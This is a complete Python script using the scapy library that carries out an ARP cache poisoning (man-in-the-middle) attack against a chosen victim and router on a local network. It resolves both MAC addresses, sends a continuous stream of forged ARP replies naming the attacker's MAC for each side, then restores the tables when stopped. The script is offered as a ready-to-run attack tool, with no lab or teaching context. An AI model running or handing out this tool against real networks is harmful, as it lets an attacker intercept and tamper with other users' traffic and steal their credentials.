import os, sys, time
from scapy.all import *

def get_mac(ip):
    # build arp request
    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    
    # send probe to broadcast address / record response
    ans, unans = srp(arp_req, timeout=5, verbose=0)
    
    if ans:
        return ans[0][1].hwsrc
    else:
        return None

def main():
    if os.geteuid() != 0:
        sys.exit('\r\nScript requires root elevation!\r\n')
        
    if len(sys.argv) != 6:
        sys.exit('\r\nUsage: <router-ip> <victim-ip> <attacker-mac> <iface> <wait-ms|0=none>\r\n')
    
    # set ip address/s
    router_ip = sys.argv[1]
    victim_ip = sys.argv[2]
    
    # set attacker mac address
    mymac = sys.argv[3]
    
    # set attacker interface
    iface = sys.argv[4]
    
    # set delay (milliseconds)
    use_delay = False
    
    if int(sys.argv[5]) != 0:
        use_delay = True
    
    print('[~] Resolving Router and Victim to MAC address...')
    
    # capture mac address/s
    router_mac = get_mac(router_ip)
    victim_mac = get_mac(victim_ip)
    
    # ensure capture was successful
    if not router_mac:
        sys.exit('\r\n[-] Unable to resolve router!\r\n')
    elif not victim_mac:
        sys.exit('\r\n[-] Unable to resolve victim!\r\n')
    
    print('\r\n[!] ARP Poinson active! CTRL+C to stop...\r\n')
    time.sleep(1)

    ##############################
    # build malicious arp attack #
    ##########################################################################################################
    # Attack #1: ARP response from Router -> Victim (spoof router MAC as yours)                              #
    ##########################################################################################################
    pkt_1 = Ether(dst=victim_mac) / ARP(op=2, psrc=router_ip, pdst=victim_ip, hwsrc=mymac, hwdst=victim_mac)
    
    ##########################################################################################################
    # Attack #2: ARP response from Victim -> Router (spoof victim MAC as yours)                              #
    ##########################################################################################################
    pkt_2 = Ether(dst=router_mac) / ARP(op=2, psrc=victim_ip, pdst=router_ip, hwsrc=mymac, hwdst=victim_mac)

    # begin attack
    while True:
        try:

            send(pkt_1, verbose=False)
            send(pkt_2, verbose=False)
        
            # sleep if specified
            if use_delay:
                time.sleep(int(sys.argv[5]) / 1000)
        except KeyboardInterrupt:
            break
        except:
            pass
    
    # reset arp tables
    print('\r\n[~] Resetting ARP tables. Do NOT exit...\r\n')

    ##########################
    # reset arp table values #
    ##################################################################################################################
    # Reset #1: ARP response from Router -> Victim (reset router mac)                                                #
    ##################################################################################################################
    pkt_1_rst = Ether(dst=victim_mac) / ARP(op=2, psrc=router_ip, pdst=victim_ip, hwsrc=router_mac, hwdst=victim_mac)
    
    ##################################################################################################################
    # Reset #2: ARP response from Victim -> Router (reset router mac)                                                #   
    ##################################################################################################################
    pkt_2_rst = Ether(dst=router_mac) / ARP(op=2, psrc=victim_ip, pdst=router_ip, hwsrc=victim_mac, hwdst=router_mac)

    try:
        send(pkt_1_rst, verbose=False)
        send(pkt_2_rst, verbose=False)
    except Exception as e:
        sys.exit(f'\r\nError: {e}\r\n')
        
    sys.exit('\r\n[+] Attack complete!\r\n')
    
if __name__ == '__main__':
    main()
